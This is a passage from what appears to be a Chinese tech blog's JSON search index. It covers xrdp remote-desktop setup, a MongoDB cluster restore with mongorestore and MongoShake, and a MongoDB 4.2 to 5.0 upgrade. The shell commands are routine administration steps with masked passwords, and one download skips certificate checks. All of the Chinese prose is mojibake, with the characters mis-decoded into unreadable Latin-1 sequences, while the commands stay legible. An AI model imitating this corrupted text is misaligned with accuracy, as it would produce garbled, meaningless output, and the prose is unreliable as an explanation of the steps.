class=\"c1\"\u003e# è¿™é‡Œæˆ‘çš„ç™»å½•ç”¨æˆ·æ˜¯debian\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo adduser debian ssl-cert\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# åŠ ç»„ä¸ç”¨é‡å¯ï¼Œå¦‚æœ‰å…¶å®ƒæ”¹åŠ¨éœ€è¦é‡å¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl restart xrdp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…«ã€å®‰è£…Firefox\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install firefox-esr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¹ã€å¼€è¿œç¨‹æ¡Œé¢ï¼Œè¿ä¸Šå»ï¼Œå¼€ä¸ªå‘½ä»¤è¡Œæ‰§è¡Œ\u003ccode\u003efirefox-esr\u003c/code\u003e\u003c/p\u003e","title":"Ubuntu å¦‚ä½•å®‰è£…è¿œç¨‹æ¡Œé¢RDP"},{"content":"è¦åšä¸€ä¸ªmongodbé›†ç¾¤çš„è¿ç§»å’Œæ¢å¤ï¼ŒçœŸæ˜¯æŠ˜è…¾æ­»äººäº†ã€‚è®°å½•å¹¶é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼š\nmongodbçš„toolsçœŸçš„æ˜¯å¤ªç®€æ˜“ã€ç²—ç³™ã€ä¸‘é™‹äº†ã€‚\nçº¿ä¸Šçš„æºæ•°æ®åº“æ˜¯è…¾è®¯çš„æœåŠ¡ï¼Œè¦åºŸå¼ƒæ¬è¿åˆ°å†…ç½‘ï¼Œè¶³è¶³æŠ˜è…¾äº†ä¸€ä¸ªæ˜ŸæœŸã€‚\nçº¿ä¸Šæºæ•°æ®åº“ç¯å¢ƒå¦‚ä¸‹ï¼š\näº‘æ•°æ®åº“ TencentDB 4C/8GB/500GB 3èŠ‚ç‚¹ äºæ˜¯åœ¨çº¿ä¸‹å¯¹ç­‰å»ºç«‹äº†mongoé›†ç¾¤ï¼ŒåŒæ ·é…ç½®ï¼ŒåŒæ ·3èŠ‚ç‚¹ã€‚\nå™©æ¢¦ç”±æ­¤å¼€å§‹å•Šï¼Œæ³¨æ„çº¿ä¸‹é›†ç¾¤çš„memoryé…ç½®ä¸€å®šè¦é«˜ï¼š\n32GB ç”¨æˆ·åå’Œå¯†ç ä¸€å®šè¦å’Œçº¿ä¸Šå®Œå…¨ä¸€è‡´ å¦‚æœç”¨æˆ·åå¯†ç ä¸ä¸€è‡´ï¼ŒDocumentæ¢å¤å®Œæ¯•ï¼ŒIndexæ— æ³•å»ºç«‹ï¼Œå› ä¸ºæ˜¯å®Œå…¨æ¢å¤ï¼Œä¼šè¦†ç›–adminè¿™ä¸ªdb ç„¶åå¼€å§‹dumpçº¿ä¸Šæ•°æ®\nmongodump -vvvvv --uri=\u0026#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026#34; ç„¶åç”Ÿæˆä¸€ä¸ª24Gå¤§å°å¾—dumpæ–‡ä»¶å¤¹ï¼Œå‹ç¼©å2.4Gï¼Œä¼ è¾“åˆ°çº¿ä¸‹åº“ä¸Šå‡†å¤‡æ¢å¤\n# å¤§é‡æ¢å¤å¿…é¡»æ‰©å¤§æ–‡ä»¶å¥æŸ„ï¼Œå¦åˆ™è¿‡ä¸å» ulimit -n 655360 # ä¸€å®šè¦è®°å½•ä¸‹æ¥å¼€å§‹çš„æ—¶é—´æˆ³ï¼Œåé¢æœ‰ç”¨ date Sun May 11 06:34:02 PM CST 2025 # å¼€å§‹æ¢å¤ï¼Œæ¼«é•¿çš„ä¸€å¤©å¼€å§‹äº† # å¿…é¡»æ”¾åˆ°screenä¸­æ‰§è¡Œï¼Œå¦åˆ™ç½‘ç»œä¸å¥½ï¼Œæ–­äº†ä¹Ÿä¼šå¾ˆæ‚²å‰§ screen -L ./mongorestore \\ --drop \\ --host=192.168.111.222 \\ --port=27017 \\ --username=root \\ --authenticationDatabase=admin \\ --nsExclude=admin \\ /root/dump ctrl+a+d å…¶å®åˆšå¼€å§‹çº¿ä¸‹ä¸‰èŠ‚ç‚¹å¾—é…ç½®æ˜¯8Gï¼Œç„¶åæ¢å¤ç”¨äº†ä¸€æ™šï¼ŒæŠ¥é”™ï¼Œç›´æ¥æŠŠshard3ç»™æ‰“å´©äº†ï¼Œè™½ç„¶ä¸‰èŠ‚ç‚¹éƒ½æ˜¯dockerå¯åŠ¨å¾—ï¼Œæœ‰è‡ªåŠ¨æ¢å¤æœºåˆ¶ï¼Œä½†æ˜¯mongorestoreå¯ä¸ç®¡è¿™ä¸ªï¼Œä¸­æ–­æœŸé—´æœ‰1000ä¸ªDocumentæ²¡æœ‰æ¢å¤æˆåŠŸã€‚\né‡è¯•äº†2æ¬¡åæ‰å‘ç°è¿™é—®é¢˜ï¼Œ2å¤©å·²ç»è¿‡å»äº†ï¼Œæ„è¯†åˆ°å°±ç«‹åˆ»æŠŠå†…å­˜æå‡åˆ°32Gï¼Œå†æ¬¡è¿›è¡Œæ¢å¤ã€‚\nä½†æ˜¯æ–°å»ºçš„é›†ç¾¤çš„å¯†ç è·Ÿæºåº“è¿™æ—¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œåˆä¸€å¤©è¿‡å»äº†ï¼ŒDocumentæ–‡æ¡£æ˜¯æ¢å¤å®Œæ¯•ï¼ŒIndexåˆæ— æ³•å»ºç«‹ï¼Œå› ä¸ºç”¨æˆ·åå’Œå¯†ç ä¸ä¸€è‡´ï¼ŒFuckï¼\nåˆåŒå’å†æ¬¡å¼€å§‹æ¢å¤ï¼Œè¿™ä¸‹å¤©ä¸‹å¤§å‰äº†ï¼Œç„¶åè¿™è¿˜ä¸ç®—å®Œï¼\nrestoreåï¼Œå…¶å®åˆè¿‡äº†ä¸€å¤©ï¼Œé‚£è¦è¿½å¹³ä¹‹åçš„æ•°æ®ï¼Œå°±å¾—ç”¨ä¸Šå®æ—¶åŒæ­¥å·¥å…·äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯é˜¿é‡Œçš„mongoshake\nä¸‹è½½ï¼š\nwget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz tar zxvf mongo-shake-v2.8.5.tgz cd mongo-shake-v2.8.5 wget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf æˆ‘ä»¬éœ€è¦æ³¨æ„collector.confçš„ä»¥ä¸‹åœ°æ–¹ï¼š\n# æºæ•°æ®åº“ mongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin # ç›®æ ‡æ•°æ®åº“ tunnel.address = mongodb://root:xxxxxxxx@192.168.4.5:27017/?authSource=admin # åŒæ­¥æ¨¡å¼ï¼Œallè¡¨ç¤ºå…¨é‡+å¢é‡åŒæ­¥ï¼Œfullè¡¨ç¤ºå…¨é‡åŒæ­¥ï¼Œincrè¡¨ç¤ºå¢é‡åŒæ­¥ã€‚ # ä¹Ÿå°±æ˜¯è¯´ï¼Œå…¶å®æˆ‘ä»¬ä¸€å¼€å§‹å°±å¯ä»¥ç”¨fullæ¨¡å¼æ¥è¿›è¡ŒåŒæ­¥ï¼Œé‚£ä¸ºä»€ä¹ˆä¸å‘¢ï¼Ÿçœ‹ä¸‹é¢çš„è§£é‡Š sync_mode = incr # é‚£è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå°±æ˜¯å¦‚æœmongoshakeçš„collectorè¿›ç¨‹æ‰äº†ï¼Œæ¯”å¦‚è¢«OOMäº† # ä¸‹æ¬¡å†å¯åŠ¨ï¼Œä¼šé‡æ–°å…¨é‡åŒæ­¥è¿˜æ˜¯æ¥ç€å¢é‡åŒæ­¥å‘¢ï¼Ÿ # ç­”æ¡ˆæ˜¯ï¼šåŒæ­¥çš„æ—¶å€™ï¼Œcollectorä¼šåœ¨æºåº“å»ºç«‹ä¸€ä¸ªmongoshakeçš„dbï¼Œé‡Œé¢æœ‰ä¸ªè¡¨ckpt_defaultï¼Œé‡Œé¢æ”¾ç€åŒæ­¥ä¿¡æ¯ # collectoré‡å¯åä¼šè¯»å–è¿™ä¸ªè¡¨è¿›è¡Œå¢é‡åŒæ­¥ï¼Œå“ªæ€• sync_mode=full # æ‰€ä»¥å¦‚æœæƒ³é‡å¯åé‡æ–°å…¨é‡åŒæ­¥ï¼Œé‚£å°±éœ€è¦æ‰‹åŠ¨åˆ äº†è¿™ä¸ªè¡¨ï¼Œæˆ–è€…æ¢ä¸ªè¡¨åï¼Œæ¯”å¦‚æ¢æˆckpt_sync # é‚£mongoshakeå®é™…æ˜¯æ ¹æ®oplogè¿›è¡ŒåŒæ­¥çš„ï¼Œé‚£å¦‚æœä»¥å‰çš„oplogæœ‰åˆ é™¤ï¼Œæˆ‘ä»¬å°±å¿…é¡»ç”¨dumpå’Œrestoreè¿›è¡Œä¸€æ¬¡å®Œæ•´å¤‡ä»½æ¢å¤ # ç„¶åå†è¿›è¡Œè¿½å¹³ï¼Œé‚£åˆšå¼€å§‹æˆ‘ä»¬è®°å½•ä¸‹æ¥çš„æ—¶é—´æˆ³å°±æœ‰ç”¨äº† # Sun May 11 06:34:02 PM CST 2025 ä¸‹åˆ16ç‚¹34åˆ† # collectorç”¨çš„æ˜¯USTæ—¶é—´ï¼Œæˆ‘ä»¬çš„æ—¶é—´æ˜¯ä¸œå…«åŒºï¼ŒCSTï¼Œæ‰€ä»¥è¦å‡å»8å°æ—¶ï¼Œ16-8=8 # é‚£å°±æ˜¯ï¼š2025-05-11T08:30:00Z æ—¶é—´ç¨ç¨å‰æ¨ä¸€ç‚¹ï¼Œç„¶åè¿½å¹³æ•°æ® checkpoint.storage.db = mongoshake checkpoint.storage.collection = ckpt_default checkpoint.start_position = 2025-05-11T08:30:00Z ç„¶åæ³¨æ„ï¼Œæºåº“å®é™…æ˜¯ä¸ªä»£ç†ï¼Œç›´æ¥è¿çš„è¯ï¼Œæœ‰ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œè€Œmongoshakeæ˜¯å¤Ÿä¸åˆ°è¿™ä¸‰ä¸ªèŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥éœ€è¦å¼ºåˆ¶æ”¹æˆä¸€ä¸ªç›´æ¥è¿æ¥ï¼š\nmongo_urls = mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026amp;connect=direct ç„¶åå°±å¼€å§‹åŒæ­¥\n# æ³¨æ„ï¼Œä¸€å®šæ”¾åˆ°screené‡Œ screen -L # verbose éœ€è¦æ˜¯0ï¼Œè®°å½•åˆ°æ–‡æœ¬æ–‡ä»¶ï¼Œä¾¿äºä¹‹åæŒç»­è§‚å¯Ÿ ./collector.linux -conf=collector.conf -verbose 0 çœ‹æ—¥å¿—æœ‰åŒæ­¥çš„ï¼Œå°±OK\n","permalink":"https://rendoumi.com/posts/20250512-mongodb-restore/","summary":"\u003cp\u003eè¦åšä¸€ä¸ªmongodbé›†ç¾¤çš„è¿ç§»å’Œæ¢å¤ï¼ŒçœŸæ˜¯æŠ˜è…¾æ­»äººäº†ã€‚è®°å½•å¹¶é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003emongodbçš„toolsçœŸçš„æ˜¯å¤ªç®€æ˜“ã€ç²—ç³™ã€ä¸‘é™‹äº†ã€‚\u003c/p\u003e\n\u003cp\u003eçº¿ä¸Šçš„æºæ•°æ®åº“æ˜¯è…¾è®¯çš„æœåŠ¡ï¼Œè¦åºŸå¼ƒæ¬è¿åˆ°å†…ç½‘ï¼Œè¶³è¶³æŠ˜è…¾äº†ä¸€ä¸ªæ˜ŸæœŸã€‚\u003c/p\u003e\n\u003cp\u003eçº¿ä¸Šæºæ•°æ®åº“ç¯å¢ƒå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eäº‘æ•°æ®åº“ TencentDB\u003c/li\u003e\n\u003cli\u003e4C/8GB/500GB\u003c/li\u003e\n\u003cli\u003e3èŠ‚ç‚¹\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eäºæ˜¯åœ¨çº¿ä¸‹å¯¹ç­‰å»ºç«‹äº†mongoé›†ç¾¤ï¼ŒåŒæ ·é…ç½®ï¼ŒåŒæ ·3èŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eå™©æ¢¦ç”±æ­¤å¼€å§‹å•Šï¼Œæ³¨æ„çº¿ä¸‹é›†ç¾¤çš„memoryé…ç½®ä¸€å®šè¦é«˜ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e32GB\u003c/li\u003e\n\u003cli\u003eç”¨æˆ·åå’Œå¯†ç ä¸€å®šè¦å’Œçº¿ä¸Šå®Œå…¨ä¸€è‡´\u003c/li\u003e\n\u003cli\u003eå¦‚æœç”¨æˆ·åå¯†ç ä¸ä¸€è‡´ï¼ŒDocumentæ¢å¤å®Œæ¯•ï¼ŒIndexæ— æ³•å»ºç«‹ï¼Œå› ä¸ºæ˜¯å®Œå…¨æ¢å¤ï¼Œä¼šè¦†ç›–adminè¿™ä¸ªdb\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç„¶åå¼€å§‹dumpçº¿ä¸Šæ•°æ®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump -vvvvv --uri\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åç”Ÿæˆä¸€ä¸ª24Gå¤§å°å¾—dumpæ–‡ä»¶å¤¹ï¼Œå‹ç¼©å2.4Gï¼Œä¼ è¾“åˆ°çº¿ä¸‹åº“ä¸Šå‡†å¤‡æ¢å¤\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¤§é‡æ¢å¤å¿…é¡»æ‰©å¤§æ–‡ä»¶å¥æŸ„ï¼Œå¦åˆ™è¿‡ä¸å»\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -n \u003cspan class=\"m\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ä¸€å®šè¦è®°å½•ä¸‹æ¥å¼€å§‹çš„æ—¶é—´æˆ³ï¼Œåé¢æœ‰ç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSun May \u003cspan class=\"m\"\u003e11\u003c/span\u003e 06:34:02 PM CST \u003cspan class=\"m\"\u003e2025\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¼€å§‹æ¢å¤ï¼Œæ¼«é•¿çš„ä¸€å¤©å¼€å§‹äº†\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¿…é¡»æ”¾åˆ°screenä¸­æ‰§è¡Œï¼Œå¦åˆ™ç½‘ç»œä¸å¥½ï¼Œæ–­äº†ä¹Ÿä¼šå¾ˆæ‚²å‰§\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen -L\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mongorestore \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --drop \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --host\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.111.222 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --port\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e27017\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --username\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --authenticationDatabase\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   --nsExclude\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   /root/dump\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ctrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…¶å®åˆšå¼€å§‹çº¿ä¸‹ä¸‰èŠ‚ç‚¹å¾—é…ç½®æ˜¯8Gï¼Œç„¶åæ¢å¤ç”¨äº†ä¸€æ™šï¼ŒæŠ¥é”™ï¼Œç›´æ¥æŠŠshard3ç»™æ‰“å´©äº†ï¼Œè™½ç„¶ä¸‰èŠ‚ç‚¹éƒ½æ˜¯dockerå¯åŠ¨å¾—ï¼Œæœ‰è‡ªåŠ¨æ¢å¤æœºåˆ¶ï¼Œä½†æ˜¯mongorestoreå¯ä¸ç®¡è¿™ä¸ªï¼Œä¸­æ–­æœŸé—´æœ‰1000ä¸ªDocumentæ²¡æœ‰æ¢å¤æˆåŠŸã€‚\u003c/p\u003e\n\u003cp\u003eé‡è¯•äº†2æ¬¡åæ‰å‘ç°è¿™é—®é¢˜ï¼Œ2å¤©å·²ç»è¿‡å»äº†ï¼Œæ„è¯†åˆ°å°±ç«‹åˆ»æŠŠå†…å­˜æå‡åˆ°32Gï¼Œå†æ¬¡è¿›è¡Œæ¢å¤ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æ–°å»ºçš„é›†ç¾¤çš„å¯†ç è·Ÿæºåº“è¿™æ—¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œåˆä¸€å¤©è¿‡å»äº†ï¼ŒDocumentæ–‡æ¡£æ˜¯æ¢å¤å®Œæ¯•ï¼ŒIndexåˆæ— æ³•å»ºç«‹ï¼Œå› ä¸ºç”¨æˆ·åå’Œå¯†ç ä¸ä¸€è‡´ï¼ŒFuckï¼\u003c/p\u003e\n\u003cp\u003eåˆåŒå’å†æ¬¡å¼€å§‹æ¢å¤ï¼Œè¿™ä¸‹å¤©ä¸‹å¤§å‰äº†ï¼Œç„¶åè¿™è¿˜ä¸ç®—å®Œï¼\u003c/p\u003e\n\u003cp\u003erestoreåï¼Œå…¶å®åˆè¿‡äº†ä¸€å¤©ï¼Œé‚£è¦è¿½å¹³ä¹‹åçš„æ•°æ®ï¼Œå°±å¾—ç”¨ä¸Šå®æ—¶åŒæ­¥å·¥å…·äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯é˜¿é‡Œçš„mongoshake\u003c/p\u003e\n\u003cp\u003eä¸‹è½½ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf mongo-shake-v2.8.5.tgz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongo-shake-v2.8.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬éœ€è¦æ³¨æ„\u003ccode\u003ecollector.conf\u003c/code\u003eçš„ä»¥ä¸‹åœ°æ–¹ï¼š\u003c/p\u003e","title":"mongodb é›†ç¾¤çš„æ¢å¤"},{"content":"mongodb å…¬å¸ç°åœ¨è¿è¡Œçš„ç‰ˆæœ¬æ˜¯mongodb 4.2.19ï¼Œåœ¨å¤„ç†allowDiskUseçš„æ—¶å€™å¤±è´¥\nå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œä¼¼ä¹å¦å¤–ä¸€ä¸ªé›†ç¾¤è·‘çš„æ˜¯5.0.5ï¼Œå°±æ²¡æœ‰é—®é¢˜\né‚£å°±å‡çº§ä¸€ä¸‹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆä¸‹è½½ 5.0.30\nwget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz ç„¶åè§£å‹å¼„å¥½ï¼Œå‡†å¤‡å¥½mongodb.conf\ndumpä¸‹æ¥è€æ•°æ®ï¼Œä¸åŠ Â·\u0026ndash;quietÂ·çš„å‚æ•°æœ‰å¯èƒ½ä¼šé‡åˆ°EOFçš„é”™è¯¯\nmkdir mongobackup cd mongobackup mongodump --quiet ç„¶åæ€æ‰4.2.19ï¼Œå¯åŠ¨5.0.30ï¼ŒæŠŠæ•°æ®å›çŒå›å»ï¼ŒåŒæ ·è¦ç”¨--quietå‚æ•°\ncd mongobackup mongorestore --quiet è¿™æ ·å°±OKäº†ã€‚\næ³¨æ„ï¼Œmongo æ˜¯åƒå†…å­˜å¤§æˆ·ï¼Œå¦‚æœå¤‡ä»½ä¸ä¸‹æ¥ï¼Œæˆ–è€…æ¢å¤ä¸è¿›å»ï¼Œè¯·å¢åŠ å†…å­˜ã€‚\næ›¾æœ‰è¿‡ä¸€æ¬¡ï¼Œ8G-\u0026gt;16G-\u0026gt;32G æ‰æˆåŠŸã€‚\nè€Œä¸”å¿…é¡»ä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œå¤‡ä»½ï¼Œä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œæ¢å¤ï¼Œè®°å¾—å¤‡ä»½ admin æ•°æ®åº“\nmongodump -d message mongorestore --port 37017 --drop --nsInclude=message.* ","permalink":"https://rendoumi.com/posts/20250122-mongodb_upgrade/","summary":"\u003cp\u003emongodb å…¬å¸ç°åœ¨è¿è¡Œçš„ç‰ˆæœ¬æ˜¯mongodb 4.2.19ï¼Œåœ¨å¤„ç†allowDiskUseçš„æ—¶å€™å¤±è´¥\u003c/p\u003e\n\u003cp\u003eå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œä¼¼ä¹å¦å¤–ä¸€ä¸ªé›†ç¾¤è·‘çš„æ˜¯5.0.5ï¼Œå°±æ²¡æœ‰é—®é¢˜\u003c/p\u003e\n\u003cp\u003eé‚£å°±å‡çº§ä¸€ä¸‹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä¸‹è½½ 5.0.30\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åè§£å‹å¼„å¥½ï¼Œå‡†å¤‡å¥½mongodb.conf\u003c/p\u003e\n\u003cp\u003edumpä¸‹æ¥è€æ•°æ®ï¼Œä¸åŠ Â·\u0026ndash;quietÂ·çš„å‚æ•°æœ‰å¯èƒ½ä¼šé‡åˆ°\u003ccode\u003eEOF\u003c/code\u003eçš„é”™è¯¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongodump --quiet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæ€æ‰4.2.19ï¼Œå¯åŠ¨5.0.30ï¼ŒæŠŠæ•°æ®å›çŒå›å»ï¼ŒåŒæ ·è¦ç”¨\u003ccode\u003e--quiet\u003c/code\u003eå‚æ•°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e mongobackup\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emongorestore --quiet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±OKäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼Œmongo æ˜¯åƒå†…å­˜å¤§æˆ·ï¼Œå¦‚æœå¤‡ä»½ä¸ä¸‹æ¥ï¼Œæˆ–è€…æ¢å¤ä¸è¿›å»ï¼Œè¯·å¢åŠ å†…å­˜ã€‚\u003c/p\u003e\n\u003cp\u003eæ›¾æœ‰è¿‡ä¸€æ¬¡ï¼Œ8G-\u0026gt;16G-\u0026gt;32G æ‰æˆåŠŸã€‚\u003c/p\u003e\n\u003cp\u003eè€Œä¸”å¿…é¡»ä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œå¤‡ä»½ï¼Œä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œæ¢å¤ï¼Œè®°å¾—å¤‡ä»½ admin 